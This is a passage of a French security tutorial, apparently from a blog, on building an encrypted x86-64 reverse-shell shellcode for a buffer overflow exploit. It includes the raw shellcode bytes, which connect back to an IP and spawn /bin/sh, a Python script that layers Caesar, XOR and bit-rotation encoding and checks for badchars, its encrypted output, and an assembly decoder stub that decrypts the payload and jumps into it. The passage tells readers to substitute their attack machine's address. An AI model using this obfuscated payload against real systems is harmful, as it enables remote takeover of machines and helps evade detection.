+</code></pre></div><p>Nous pouvons voir que notre shellcode ne contient aucun badchar. En réalité, il en contient un qui est <code>\x0a</code>. Cependant, cela correspond au <code>10</code> de notre adresse IP et cela ne posera donc aucun problème.</p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Ici, l&rsquo;adresse IP <code>127.1.10.100</code> est utilisée pour l&rsquo;exemple. Bien sûr, cela n&rsquo;a aucun intérêt puisque nous ouvrons un shell sur notre machine depuis notre machine. Néanmoins, il suffit de remplacer l&rsquo;IP par l&rsquo;adresse de notre machine d&rsquo;attaque ainsi que de modifier la longueur totale du socket (troisième argument de la fonction <code>connect</code>), si cela est nécessaire. En effet, ce shellcode sera exécuté sur la machine cible, lors de l&rsquo;exécution du buffer overflow, qui se connectera alors à notre machine d&rsquo;attaque. Ainsi, nous aurons une connexion entrante sur le port de notre machine d&rsquo;attaque qui nous permettra d&rsquo;effectuer des commandes sur la machine cible.</div>
+        </div>
+    </div>
+<h3 id="chiffrement-du-shellcode">Chiffrement du shellcode</h3>
+<p>Ensuite, nous devons chiffrer notre shellcode. Pour cela, un script Python, par exemple, serait utile afin de ne pas avoir à le faire à la main.</p>
+<p>Voici donc le code Python qui nous permettra de chiffrer facilement notre shellcode :</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="ch">#!/usr/bin/env python3</span>
+<span class="ln"> 2</span><span class="c1">#encoding: UTF-8</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="ln"> 5</span><span class="kn">import</span> <span class="nn">argparse</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="n">verificator</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="ln"> 8</span><span class="n">encryptedShellcode</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="ln"> 9</span>
+<span class="ln">10</span><span class="c1"># Bit shift operation to the left</span>
+<span class="ln">11</span><span class="n">rol</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">aValue</span><span class="p">,</span> <span class="n">aBitShift</span><span class="p">,</span> <span class="n">aMaxBits</span><span class="o">=</span><span class="mi">8</span><span class="p">:</span> <span class="p">(</span><span class="n">aValue</span> <span class="o">&lt;&lt;</span> <span class="n">aBitShift</span> <span class="o">%</span> <span class="n">aMaxBits</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="n">aMaxBits</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">aValue</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="n">aMaxBits</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">aMaxBits</span> <span class="o">-</span> <span class="p">(</span><span class="n">aBitShift</span> <span class="o">%</span> <span class="n">aMaxBits</span><span class="p">)))</span> 
+<span class="ln">12</span>
+<span class="ln">13</span><span class="c1"># Statement of program arguments</span>
+<span class="ln">14</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+<span class="ln">15</span><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--shellcode&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;The shellcode&#34;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="ln">16</span><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--XOR&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;The XOR key&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="ln">17</span><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--cesarKey1&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;The first cesar key&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="ln">18</span><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--cesarKey2&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;The second cesar key&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="ln">19</span><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--ROL1&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;The first bit shift key&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="ln">20</span><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--ROL2&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;The second bit shift key&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="ln">21</span><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+<span class="ln">22</span>
+<span class="ln">23</span><span class="n">shellcodeSplitted</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">shellcode</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;x&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
+<span class="ln">24</span>
+<span class="ln">25</span><span class="c1"># Browsing of the shellcode</span>
+<span class="ln">26</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcodeSplitted</span><span class="p">)):</span>
+<span class="ln">27</span>    <span class="n">verificator</span> <span class="o">=</span> <span class="n">verificator</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="ln">28</span>
+<span class="ln">29</span>    <span class="k">if</span> <span class="n">verificator</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+<span class="ln">30</span>        <span class="n">encryptedShellcode</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">shellcodeSplitted</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">args</span><span class="o">.</span><span class="n">cesarKey1</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">))</span> <span class="c1"># Cesar cipher with first key</span>
+<span class="ln">31</span>    <span class="k">elif</span> <span class="n">verificator</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+<span class="ln">32</span>        <span class="n">encryptedShellcode</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">shellcodeSplitted</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="n">args</span><span class="o">.</span><span class="n">XOR</span><span class="p">)))</span> <span class="c1"># XOR with key</span>
+<span class="ln">33</span>    <span class="k">else</span><span class="p">:</span>
+<span class="ln">34</span>        <span class="n">encryptedShellcode</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">shellcodeSplitted</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">args</span><span class="o">.</span><span class="n">cesarKey2</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">))</span> <span class="c1"># Cesar cipher with second key</span>
+<span class="ln">35</span>        <span class="n">verificator</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="ln">36</span>
+<span class="ln">37</span><span class="c1"># Browsing of the shellcode</span>
+<span class="ln">38</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encryptedShellcode</span><span class="p">)):</span>
+<span class="ln">39</span>    <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+<span class="ln">40</span>        <span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="n">args</span><span class="o">.</span><span class="n">ROL1</span><span class="p">))</span> <span class="c1"># Bit shift operation to the left with first key</span>
+<span class="ln">41</span>    <span class="k">else</span><span class="p">:</span>
+<span class="ln">42</span>        <span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="n">args</span><span class="o">.</span><span class="n">ROL2</span><span class="p">))</span> <span class="c1"># Bit shift operation to the left with second key</span>
+<span class="ln">43</span>
+<span class="ln">44</span><span class="c1"># Shellcode reconstruction and badchars detection</span>
+<span class="ln">45</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encryptedShellcode</span><span class="p">)):</span>
+<span class="ln">46</span>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+<span class="ln">47</span>        <span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x0&#34;</span> <span class="o">+</span> <span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="ln">48</span>    <span class="k">else</span><span class="p">:</span>
+<span class="ln">49</span>        <span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x&#34;</span> <span class="o">+</span> <span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="p">::]</span>
+<span class="ln">50</span>
+<span class="ln">51</span>    <span class="k">if</span> <span class="n">encryptedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x00&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x0a&#34;</span><span class="p">]:</span>
+<span class="ln">52</span>        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;Error : Badchar detected&#34;</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+<span class="ln">53</span>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="ln">54</span>
+<span class="ln">55</span><span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;The encrypted shellcode : {anEncryptedShellcode}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">anEncryptedShellcode</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">encryptedShellcode</span><span class="p">)))</span>
+</code></pre></div><p>Ce code permet de prendre plusieurs arguments en entrée dont le shellcode à chiffrer et les différentes clefs à utiliser.</p>
+<p>Il va parcourir le shellcode deux fois de suite afin d&rsquo;y appliquer plusieurs chiffrements de manière mélangée et superposée.</p>
+<p>Lors du premier parcours, un chiffrement cesar+ sera appliqué sur le premier caractère, suivi d&rsquo;un XOR sur le second et d&rsquo;un chiffrement cesar- sur le troisième. Ce cycle est répété jusqu&rsquo;à la fin du shellcode.</p>
+<p>Lors du second parcours, un décalage de bit vers la gauche est effectué sur le premier caractère puis un second est de nouveau effectué sur le deuxième caractère avec une clef différente. Ce cycle est répété jusqu&rsquo;à la fin du shellcode.</p>
+<p>Enfin, une détection des badchars est effectuée afin de s&rsquo;assurer que notre shellcode chiffré n&rsquo;en contiennent pas.</p>
+<p>Nous pouvons rendre ce programme exécutable :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>chmod +x cipherShellcode.py
+</code></pre></div><p>Puis, nous pouvons l&rsquo;exécuter via la commande suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>./cipherShellcode.py --shellcode <span class="se">\x</span>68<span class="se">\x</span>7f<span class="se">\x</span>01<span class="se">\x</span>0a<span class="se">\x</span>64<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>7a<span class="se">\x</span>69<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>40<span class="se">\x</span>b6<span class="se">\x</span>01<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>40<span class="se">\x</span>b7<span class="se">\x</span>02<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>b0<span class="se">\x</span>29<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b2<span class="se">\x</span>11<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>34<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c7<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>b0<span class="se">\x</span>2a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>b0<span class="se">\x</span>21<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>40<span class="se">\x</span>fe<span class="se">\x</span>c6<span class="se">\x</span>b0<span class="se">\x</span>21<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>40<span class="se">\x</span>fe<span class="se">\x</span>c6<span class="se">\x</span>b0<span class="se">\x</span>21<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>bf<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>3c<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>b0<span class="se">\x</span>3b<span class="se">\x</span>0f<span class="se">\x</span><span class="m">05</span> --cesarKey1 <span class="m">13</span> --XOR <span class="m">7</span> --cesarKey2 <span class="m">18</span> --ROL1 <span class="m">3</span> --ROL2 <span class="m">5</span>
+</code></pre></div><p>Le résultat nous indique :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>The encrypted shellcode : <span class="se">\x</span>ab<span class="se">\x</span>0f<span class="se">\x</span>7f<span class="se">\x</span>e2<span class="se">\x</span>1b<span class="se">\x</span>8a<span class="se">\x</span>ab<span class="se">\x</span>af<span class="se">\x</span>ba<span class="se">\x</span>6e<span class="se">\x</span>6b<span class="se">\x</span>1e<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>06<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>9c<span class="se">\x</span>6a<span class="se">\x</span>36<span class="se">\x</span>7f<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>bd<span class="se">\x</span>6a<span class="se">\x</span>16<span class="se">\x</span>87<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>d5<span class="se">\x</span>ed<span class="se">\x</span>c5<span class="se">\x</span>ef<span class="se">\x</span>42<span class="se">\x</span>7a<span class="se">\x</span>e3<span class="se">\x</span>fe<span class="se">\x</span>b6<span class="se">\x</span>ff<span class="se">\x</span>aa<span class="se">\x</span>54<span class="se">\x</span>44<span class="se">\x</span>89<span class="se">\x</span>e9<span class="se">\x</span>bb<span class="se">\x</span>9a<span class="se">\x</span>7a<span class="se">\x</span>e3<span class="se">\x</span>6e<span class="se">\x</span>f6<span class="se">\x</span>c0<span class="se">\x</span>83<span class="se">\x</span>10<span class="se">\x</span>c6<span class="se">\x</span>f1<span class="se">\x</span>3e<span class="se">\x</span>f4<span class="se">\x</span>c5<span class="se">\x</span>40<span class="se">\x</span>7e<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>a5<span class="se">\x</span>b7<span class="se">\x</span>31<span class="se">\x</span>bf<span class="se">\x</span>90<span class="se">\x</span>e8<span class="se">\x</span>67<span class="se">\x</span>7a<span class="se">\x</span>bd<span class="se">\x</span>e1<span class="se">\x</span>e0<span class="se">\x</span>40<span class="se">\x</span>b1<span class="se">\x</span>99<span class="se">\x</span>41<span class="se">\x</span>a3<span class="se">\x</span>7b<span class="se">\x</span>cd<span class="se">\x</span>e2<span class="se">\x</span>87<span class="se">\x</span>a3<span class="se">\x</span>ca<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>27<span class="se">\x</span>6c<span class="se">\x</span>82<span class="se">\x</span>c6<span class="se">\x</span>f1<span class="se">\x</span>ba<span class="se">\x</span>b1<span class="se">\x</span>53<span class="se">\x</span>d9<span class="se">\x</span>42<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>75<span class="se">\x</span>b7<span class="se">\x</span>e1<span class="se">\x</span>bf<span class="se">\x</span><span class="m">90</span>
+</code></pre></div><p>Nous avons désormais notre shellcode chiffré.</p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Vous pouvez changer les clefs comme vous le désirez et utiliser également un autre shellcode. Si un badchar est détecté, cela sera indiqué et il suffira de modifier une ou plusieurs clefs jusqu&rsquo;à avoir une combinaison fonctionnelle.</div>
+        </div>
+    </div>
+<h3 id="déchiffrement-du-shellcode">Déchiffrement du shellcode</h3>
+<p>Nous devons désormais déchiffrer notre shellcode. Pour cela, nous allons coder un programme en assembleur qui va inverser le processus de chiffrement de notre code Python.</p>
+<p>Voici le code assembleur permettant de déchiffrer notre shellcode :</p>
+<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="ln"> 1</span><span class="k">section</span> <span class="nv">.text</span><span class="p">:</span>
+<span class="ln"> 2</span>    <span class="k">global</span> <span class="nv">_start</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="nl">_start:</span>
+<span class="ln"> 5</span>  
+<span class="ln"> 6</span>    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">uselessButEssential</span>  <span class="c1">;jump to uselessButEssential</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span>    <span class="nl">init:</span>
+<span class="ln"> 9</span>        <span class="nf">pop</span> <span class="nb">rsi</span>                    <span class="c1">;get the shellcode address</span>
+<span class="ln">10</span>        <span class="nf">xor</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rbx</span>               <span class="c1">;set to 0 the register we use as index</span>
+<span class="ln">11</span>        <span class="nf">xor</span> <span class="nb">rcx</span><span class="p">,</span> <span class="nb">rcx</span>               <span class="c1">;set to 0 the register we use as counter</span>
+<span class="ln">12</span>        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>               <span class="c1">;set to 0 the register we use as a counter to know which decryption function to jump to</span>
+<span class="ln">13</span>        <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x66</span>               <span class="c1">;tell our counter the size of our encrypted shellcode - 1 (here 102)</span>
+<span class="ln">14</span>
+<span class="ln">15</span>    <span class="nl">router1:</span>
+<span class="ln">16</span>        <span class="nf">inc</span> <span class="nb">dl</span>                     <span class="c1">;increment by 1 the counter to know which decryption function to jump to</span>
+<span class="ln">17</span>        <span class="nf">cmp</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">2</span>                  <span class="c1">;test if our counter equals 2</span>
+<span class="ln">18</span>        <span class="nf">je</span> <span class="nv">decipherROR2</span>            <span class="c1">;if yes we jump to decipherROR2</span>
+<span class="ln">19</span>
+<span class="ln">20</span>    <span class="nl">decipherROR1:</span>
+<span class="ln">21</span>        <span class="nf">ror</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">rbx</span><span class="p">],</span> <span class="mh">0x03</span> <span class="c1">;do a bitshift to the right to decipher the first bitshift (here 3)</span>
+<span class="ln">22</span>        <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">manager1</span>         <span class="c1">;jump to manager1</span>
+<span class="ln">23</span>
+<span class="ln">24</span>    <span class="nl">decipherROR2:</span>
+<span class="ln">25</span>        <span class="nf">ror</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">rbx</span><span class="p">],</span> <span class="mh">0x05</span> <span class="c1">;do a bitshift to the right to decipher the first bitshift (here 5)</span>
+<span class="ln">26</span>        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>               <span class="c1">;set to 0 the register we use as a counter to know which decryption function to jump to</span>
+<span class="ln">27</span>
+<span class="ln">28</span>    <span class="nl">manager1:</span>
+<span class="ln">29</span>        <span class="nf">add</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>                  <span class="c1">;increment by 1 the index</span>
+<span class="ln">30</span>        <span class="nf">sub</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">1</span>                  <span class="c1">;increment by 1 the counter</span>
+<span class="ln">31</span>        <span class="nf">jno</span> <span class="nv">router1</span>                <span class="c1">;if our counter doesn&#39;t have overflow it means we&#39;re not at the end of the chain so we jump to router1</span>
+<span class="ln">32</span>
+<span class="ln">33</span>    <span class="nl">reset:</span>
+<span class="ln">34</span>        <span class="nf">xor</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rbx</span>               <span class="c1">;set to 0 the register we use as index</span>
+<span class="ln">35</span>        <span class="nf">xor</span> <span class="nb">rcx</span><span class="p">,</span> <span class="nb">rcx</span>               <span class="c1">;set to 0 the register we use as counter</span>
+<span class="ln">36</span>        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>               <span class="c1">;set to 0 the register we use as a counter to know which decryption function to jump to</span>
+<span class="ln">37</span>        <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x66</span>               <span class="c1">;tell our counter the size of our encrypted shellcode - 1 (here 102)</span>
+<span class="ln">38</span>
+<span class="ln">39</span>    <span class="nl">router2:</span>
+<span class="ln">40</span>        <span class="nf">inc</span> <span class="nb">dl</span>                     <span class="c1">;increment by 1 the register we use as a counter to know which decryption function to jump to</span>
+<span class="ln">41</span>        <span class="nf">cmp</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">2</span>                  <span class="c1">;test if our counter equals 2</span>
+<span class="ln">42</span>        <span class="nf">je</span> <span class="nv">decipherXOR</span>             <span class="c1">;if yes we jump to decipherXOR</span>
+<span class="ln">43</span>        <span class="nf">cmp</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">3</span>                  <span class="c1">;else we test if out counter equals 3</span>
+<span class="ln">44</span>        <span class="nf">je</span> <span class="nv">decipherCesarMinus</span>      <span class="c1">;if yes we jump to decipherCesarMinus</span>
+<span class="ln">45</span>
+<span class="ln">46</span>    <span class="nl">decipherCesarPlus:</span>
+<span class="ln">47</span>        <span class="nf">sub</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">rbx</span><span class="p">],</span> <span class="mh">0x0d</span> <span class="c1">;decrease the value of the current byte to decipher the first cesar (here 13)</span>
+<span class="ln">48</span>        <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">manager2</span>         <span class="c1">;jump to manager2</span>
+<span class="ln">49</span>
+<span class="ln">50</span>    <span class="nl">decipherXOR:</span>
+<span class="ln">51</span>        <span class="nf">xor</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">rbx</span><span class="p">],</span> <span class="mh">0x07</span> <span class="c1">;we XOR the current byte to decipher the XOR (here 7)</span>
+<span class="ln">52</span>        <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">manager2</span>         <span class="c1">;jump to manager2</span>
+<span class="ln">53</span>
+<span class="ln">54</span>    <span class="nl">decipherCesarMinus:</span>
+<span class="ln">55</span>        <span class="nf">add</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">rbx</span><span class="p">],</span> <span class="mh">0x12</span> <span class="c1">;we increase the value of the current byte to decipher the second cesar (here 18)</span>
+<span class="ln">56</span>        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>               <span class="c1">;increment by 1 the register we use as a counter to know which decryption function to jump to</span>
+<span class="ln">57</span>
+<span class="ln">58</span>    <span class="nl">manager2:</span>
+<span class="ln">59</span>        <span class="nf">add</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>                  <span class="c1">;increment by 1 the index</span>
+<span class="ln">60</span>        <span class="nf">sub</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">1</span>                  <span class="c1">;increment by 1 the counter</span>
+<span class="ln">61</span>        <span class="nf">jno</span> <span class="nv">router2</span>                <span class="c1">;if our counter doesn&#39;t have overflow it means we&#39;re not at the end of the chain so we jump to router1</span>
+<span class="ln">62</span>        <span class="nf">jmp</span> <span class="nb">rsi</span>                    <span class="c1">;else we jump to our decrypted shellcode</span>
+<span class="ln">63</span>
+<span class="ln">64</span>    <span class="nl">uselessButEssential:</span>
+<span class="ln">65</span>        <span class="nf">call</span> <span class="nv">init</span>                  <span class="c1">;call init</span>
+</code></pre></div><p>Tout d&rsquo;abord, nous sautons à la fonction <code>uselessButEssential</code> dans laquelle l&rsquo;on appelle la fonction <code>init</code>. Cette technique peut s&rsquo;avérer quelque peu incompréhensible. Souvenez-vous de la forme finale de notre shellcode. Nous avons d&rsquo;abord le décodeur suivi du shellcode chiffré. En faisant ce saut à cette fonction (qui doit être placé tout à la fin du code) le registre <code>rip</code> va contenir l&rsquo;adresse de la prochaine instruction à exécuter qui n&rsquo;est autre que le début de notre shellcode chiffré. L&rsquo;instruction <code>call</code> va effectuer un <code>push rip</code> ce qui mettra sur la stack l&rsquo;adresse du début de notre shellcode chiffré avant de sauter vers la fonction <code>init</code>.</p>
+<p>La fonction <code>init</code> nous permet d&rsquo;initialiser quelques variables et de récupérer l&rsquo;adresse du shellcode chiffré qui a été mise sur la stack précédemment.</p>
+<p>Viens ensuite la fonction <code>router1</code>. Souvenez-vous, nous avions chiffré un caractère sur deux avec un ROL et une clef, puis, l&rsquo;autre caractère toujours avec un ROL, mais avec une clef différente. Cette fonction va donc se charger de détecter si l&rsquo;on est sur le premier ou le second caractère afin de diriger le programme vers la bonne fonction de déchiffrement.</p>
+<p>Les fonctions <code>decipherROR1</code> et <code>decipherROR2</code> vont se charger d&rsquo;effectuer un ROR avec la clef correspondante.</p>
